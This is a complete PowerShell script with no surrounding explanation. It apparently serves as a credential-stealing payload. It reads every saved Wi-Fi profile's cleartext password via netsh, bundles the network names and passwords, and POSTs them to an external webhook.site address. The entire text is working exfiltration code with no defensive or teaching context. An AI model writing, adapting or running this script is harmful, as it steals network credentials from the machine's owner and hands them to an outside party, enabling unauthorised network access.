$w = netsh wlan show prof | sls ':(.+)$' | %{$_.Matches.Groups[1].Value.Trim()} | %{$n=$_; $k=(netsh wlan show prof name="$n" key=clear | sls 'Key Content\W+:(.+)$' | %{$_.Matches.Groups[1].Value.Trim()}); if($k){"SSID:$n | Pass:$k"}}
$data = $w | Out-String
if ($data.Trim()) {
    Invoke-RestMethod -Uri "https://webhook.site/8fae434e-1ec5-4dce-94e3-d1bf51a78a9c" -Method Post -Body $data -UseBasicParsing
}
